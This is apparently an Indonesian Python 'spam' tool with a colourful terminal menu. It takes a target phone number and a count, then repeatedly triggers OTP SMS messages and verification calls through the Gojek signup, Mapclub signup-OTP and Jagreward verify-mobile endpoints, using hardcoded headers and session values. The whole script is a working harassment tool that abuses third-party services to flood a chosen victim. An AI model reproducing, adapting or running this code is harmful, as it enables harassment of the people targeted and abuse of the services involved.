#Hallo Sayang Mau Recode Ya:*
#Pap Dulu Dong:*******
import os,sys,time,requests,subprocess
from requests import post
from time import sleep

def bersih():
    os.system("clear")

def balik():
    f = input('\033[1;91mKembali? \033[1;97m(y/t): ')
    if f == 'y':
       subprocess.call("python tools.py",shell=True)
    elif f == 't':
         print ('\033[1;91mexit!!\033[1;97m')
         sys.exit()
    else:
        print ("\033[1;91mWrong Input!!\033[1;97m")
        sys.exit()

def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./12)

def banner():
    bersih()
    subprocess.call("python2 loading.py",shell=True)
    print (" \033[1;91m▂▃▅▇█▓▒░\033[90m۩۞۩ \033[1;92mTools Ramadhan \033[90m۩۞۩\033[1;91m░▒▓█▇▅▃▂\033[1;97m")
    banner = """
\033[90m   ____________
\033[1;91m   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║ \033[1;94m     ╔══╗╔══╗╔╗╔╗╔╦╗╔═╗\033[1;91m
   ║▒▒▒▒▒▒▒▒▒▒║ \033[1;94m     ║══╣║╔╗║║╚╝║║║║║╬║\033[1;91m
   ║▒▒▒▒▒▒▒▒▒▒║ \033[1;94m     ╠══║║╠╣║║╔╗║║║║║╗╣\033[1;91m
   ║▒▒▒▒▒▒▒▒▒▒║ \033[1;94m     ╚══╝╚╝╚╝╚╝╚╝╚═╝╚╩╝\033[1;91m
   ║▒▒▒▒▒▒▒▒▒▒║
\033[90m  ╔════════════╗   \033[1;96m╔═╗╔═╗╔═╗─╔╗╔═╗╔═╗╔══╗\033[90m
  ╚════════════╝   \033[1;96m║╬║║╬║║║║─║║║╦╝║╔╝╚╗╔╝
\033[1;92m  ║██████████╚╗    \033[1;96m║╔╝║╗╣║║║╔╣║║╩╗║╚╗─║║─
\033[1;92m  ║██\033[1;91m╔══╗\033[1;92m█\033[1;91m╔═╗\033[1;92m█║    \033[1;96m╚╝─╚╩╝╚═╝╚═╝╚═╝╚═╝─╚╝─\033[1;92m
  ║██\033[1;91m║╬╔╝\033[1;92m█\033[1;91m╚╗║\033[1;92m█║
  ║██\033[1;91m╚═╝\033[1;92m█\033[1;91m║\033[1;92m█\033[1;91m╚╝\033[1;92m█║
  ╚╗█████████═╝    
   ╚╗║╠╩╩╩╩╩╝
    ║║┈┈┈\033[90m█▐█████▒.｡oO\033[1;92m
    ║██╠╦╦╦╗ \033[1;91m Coded\033[90m  :\033[1;96mFahmiApz\033[1;92m
    ╚╗██████ \033[1;91m Youtube\033[90m:\033[1;96mXmanzID\033[1;92m
     ╚════╝
\033[90m<\033[1;91m/\033[90m>\033[1;94m════════════════════════════════════════\033[90m<\033[1;91m/\033[90m>
"""
    print (banner)
banner()
print ('\033[1;94m╔════════════════════════════════════════════╗')
print ("\033[1;94m|\033[90m->\033[1;91m01 \033[90m. \033[1;92mSpam Sms\033[1;94m                             |")
print ('\033[1;94m╚════════════════════════════════════════════╝')
print ('\033[1;94m╔════════════════════════════════════════════╗')
print ("\033[1;94m|\033[90m->\033[1;91m02 \033[90m. \033[1;92mSpam Wa \033[1;94m                             |")
print ('\033[1;94m╚════════════════════════════════════════════╝')
print ('\033[1;94m╔════════════════════════════════════════════╗')
print ("\033[1;94m|\033[90m->\033[1;91m03 \033[90m. \033[1;92mSpam call\033[1;94m                            |")
print ('\033[1;94m╚════════════════════════════════════════════╝')
print ('\033[1;94m╔════════════════════════════════════════════╗')
print ('\033[1;94m|\033[90m->\033[1;91m04 \033[90m. \033[1;92mForum Diskusi\033[1;94m                        |')
print ('\033[1;94m╚════════════════════════════════════════════╝')
print ('\033[1;94m╔════════════════════════════════════════════╗')
print ('\033[1;94m|\033[90m->\033[1;91m05 \033[90m. \033[1;92mSubscribe Here To Admin\033[1;94m              |')
print ('\033[1;94m╚════════════════════════════════════════════╝')
print ('\033[1;94m╔════════════════════════════════════════════╗')
print ('\033[1;94m|\033[90m->\033[1;91m06 \033[90m. \033[1;91mExit\033[1;94m                                 |')
print ('\033[1;94m╚════════════════════════════════════════════╝')
tod = input("\033[1;91m[\033[1;92m+\033[1;91m]\033[90m>>\033[1;92m ")
if tod == "1" or tod == "01":
   print ('\033[1;94m╔════════════════════════════════════════════╗')
   print ('\033[1;94m|\033[90m->\033[1;91m01.\033[1;92m OtpGopay ')
   print ('\033[1;94m╚════════════════════════════════════════════╝')
   print ('\033[1;94m╔════════════════════════════════════════════╗')
   print ('\033[1;94m|\033[90m->\033[1;91m02.\033[1;92m OtpMapclub')
   print ('\033[1;94m╚════════════════════════════════════════════╝')
   print ('\033[1;94m╔════════════════════════════════════════════╗')
   print ('\033[1;94m|\033[90m->\033[1;91m03.\033[1;92m Kill 2 Otp')
   print ('\033[1;94m╚════════════════════════════════════════════╝')
   print ('\033[1;94m╔════════════════════════════════════════════╗')
   print ('\033[1;94m|\033[90m->\033[1;91m04.\033[1;92m Brutal Spam ')
   print ('\033[1;94m╚════════════════════════════════════════════╝')
   print ('\033[1;94m╔════════════════════════════════════════════╗')
   print ('\033[1;94m|\033[90m->\033[1;91m05.\033[1;91m Kembali')
   print ('\033[1;94m╚════════════════════════════════════════════╝')
   jir = input("\033[90mInput: \033[1;92m")
   if jir == "1":
      no = input("\033[90m[\033[1;91m!\033[90m]\033[1;96mmasukan nomor\033[90m:\033[1;91m")
      jl = int(input("\033[90m[\033[1;91m!\033[90m]\033[1;96mMasukan Jumlah\033[90m: \033[1;91m"))
      ua = {
      "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
      "X-Platform": "Android",
      "X-UniqueId": "8606f4e3b85968fd",
      "X-AppVersion": "3.52.2",
      "X-AppId": "com.gojek.app",
      "Accept": "application/json",
      "Authorization": "Bearer",
      "X-User-Type": "customer",
      "Accept-Language": "id-ID",
      "X-User-Locale": "id_ID",
      "Host": "api.gojekapi.com",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "User-Agent": "okhttp/3.12.1"
      }
      dat = {
      "email": "nsjwwiwiwisnsnn12@gmail.com",
      "name": "akuinginterbang12",
      "phone": no,
      "signed_up_country": "ID"
      }
      for i in range(jl):
          time.sleep(2)
          r = requests.post("https://api.gojekapi.com/v5/customers", data=dat, headers=ua)
          print ("\033[90m[\033[1;92m•\033[90m]\033[1;97mStatus:\033[1;92m", r.json()["success"])
      print ('\033[1;94m╚════════════════════════════════════════════╝')
   elif jir == "2":
        try:
            print ("\033[1;94m╔════════════════════════════════════════════╗")
            no = input("\033[1;94m|\033[1;97mMasukan Nomor\033[1;91m:\033[1;92m ")
            jl = int(input("\033[1;94m|\033[1;97mMasukan Jumlah Spam\033[1;91m:\033[1;92m "))
        except KeyboardInterrupt:
               print ("\033[1;91mStop!!\033[1;97m")
               sys.exit()
        head = {
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        }
        dot = {
        "phone": no,
        }
        print ("\033[1;94m|\033[1;91mWaiting\033[90m...")
        kata("\033[1;94m|\033[1;91m[\033[1;97m> > > > > > > > >\033[1;91m]")
        def kirim():
            time.sleep(1)
            r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dot, headers=head)
            print ("\033[1;94m|\033[1;91m[\033[1;92mStatus\033[1;91m]\033[1;97m:", r.json()["status"])
        for i in range(jl):
            try:
                kirim()
            except requests.exceptions.ConnectionError:
                   print ("\033[1;94m|\033[1;91mTidak Ada Koneksi!!\033[1;97m")
                   balik()
        balik()
   elif jir == "3":
        try:
            print ("\033[1;94m╔════════════════════════════════════════════╗")
            no = input("\033[1;94m|\033[1;97mMasukan Nomor\033[1;91m:\033[1;92m ")
            jl = int(input("\033[1;94m|\033[1;97mMasukan Jumlah Spam\033[1;91m:\033[1;92m "))
        except KeyboardInterrupt:
               print ("\033[1;91mStop!!\033[1;97m")
               sys.exit()
        head = {
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        }
        dot = {
        "phone": no,
        }
        print ("\033[1;94m|\033[1;91mWaiting\033[90m...")
        kata("\033[1;94m|\033[1;91m[\033[1;97m> > > > > > > > >\033[1;91m]")
        def kirim1():
            time.sleep(1)
            r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dot, headers=head)
            print ("\033[1;94m|\033[1;91m[\033[1;92mStatus\033[1;91m]\033[1;97m:", r.json()["status"])
        ua = {
        "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
        "X-Platform": "Android",
        "X-UniqueId": "8606f4e3b85968fd",
        "X-AppVersion": "3.52.2",
        "X-AppId": "com.gojek.app",
        "Accept": "application/json",
        "Authorization": "Bearer",
        "X-User-Type": "customer",
        "Accept-Language": "id-ID",
        "X-User-Locale": "id_ID",
        "Host": "api.gojekapi.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.1"
        }
        dat = {
        "email": "nsjwwiwiwisnsnn12@gmail.com",
        "name": "akuinginterbang12",
        "phone": no,
        "signed_up_country": "ID"
        }
        def kirim2():
            r = requests.post("https://api.gojekapi.com/v5/customers", data=dat, headers=ua)
            print ("\033[1;94m|\033[90m[\033[1;92m•\033[90m]\033[1;97mStatus:\033[1;92m", r.json()["success"])
        for i in range(jl):
            try:
                kirim1()
                kirim2()
            except requests.exceptions.ConnectionError:
                   print ("\033[1;94m|\033[1;91mTidak Ada Koneksi!!\033[1;97m")  
                   balik()
   elif jir == "4" or jir == "04":
        print ("\033[1;94m╔════════════════════════════════════════════╗")
        subprocess.call("python2 cfg",shell=True)
        print ("\033[1;94m╚════════════════════════════════════════════╝")
        balik()
   elif jir == "5" or jir == "05":
        subprocess.call("python tools.py",shell=True)
   else:
        print ("\033[1;94m\033[1;91mWrong Input!!\033[1;97m")
        time.sleep(1)
        balik()
elif tod == "2" or tod == "02":
     print ('\033[1;94m╔════════════════════════════════════════════╗')
     subprocess.call("python2 Hshshs",shell=True)     
     print ('\033[1;94m╚════════════════════════════════════════════╝')
     balik()
elif tod == "03" or tod == "3":
      print ("\033[1;94m╔════════════════════════════════════════════════════╗")
      print ("\033[1;94m|\033[1;92mhttps://id.jagreward.com/member/verify-mobile/nomor")
      print ("\033[1;94m|\033[90m====================================================")
      print ("\033[1;94m|\033[1;97mSalin Link Di Atas Ini\n\033[1;94m|\033[1;97mPada bagian nomor masukan nomor tanpa +62/0\n\033[1;94m|\033[1;97mMaksimal 3x Spam Dalam 30 Menit")
      print ("\033[1;94m|\033[90m====================================================")
      jm = input("\033[1;94m|\033[1;97mInput\033[1;91m:\033[1;92m")
      jh = int(input("\033[1;94m|\033[1;97mJumlah Spam:\033[1;92m"))
      time.sleep(2)
      print ("\033[1;94m|\033[1;92mLoading\033[1;97m...")
      time.sleep(2)
      head = {
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
      "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
      "Content-Type": "application/json",
      "Origin": "https://id.jagreward.com",
      "Referer": "https://id.jagreward.com/member/register/",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
      "_ga": "GA1.2.2037151396.1584709855",
      "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
      "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
      }
      bro = {
      "method": "CALL",
      "countryCode": "id",
      }
      def kirim():
          try:
              for i in range(jh):
                  r = requests.get(jm,data=bro, headers=head)
                  print ("\033[1;94m|\033[1;97mStatus\033[1;97m:\033[1;92m", r.json()["message"])
                  time.sleep(5)
          except KeyboardInterrupt:
                 print ("\033[1;91mStop!!")
      kirim()
      balik()
elif tod == "4" or tod == "04":
     print ("\033[1;94m╔════════════════════════════════════════════╗")
     print ("\033[1;94m|\033[1;91mWaiting\033[90m...")
     time.sleep(1)
     os.system("xdg-open https://t.me/TuyullBeginners")
     time.sleep(6)
     print ("\033[1;94m\033[1;92m Enjoy Your Life\033[1;97m:)")
     time.sleep(1)
     balik()
elif tod == "05" or tod == "5":
     print ("\033[1;94m╔════════════════════════════════════════════╗")
     print ("\033[1;94m|\033[1;91mWaiting\033[90m....")
     time.sleep(1)
     os.system("xdg-open https://www.youtube.com/channel/UCbraGGLYSgD5Rsz29W3eorw")
     time.sleep(6)
     print ("\033[1;94m|\033[1;92mThanks For Watching\033[1;97m:)")
     balik()
elif tod == "6" or tod == "06":
     print ("\033[1;91mExit")
     sys.exit()
else:
    print ("\033[1;91mWrong Input!!")
    time.sleep(1)
    balik()
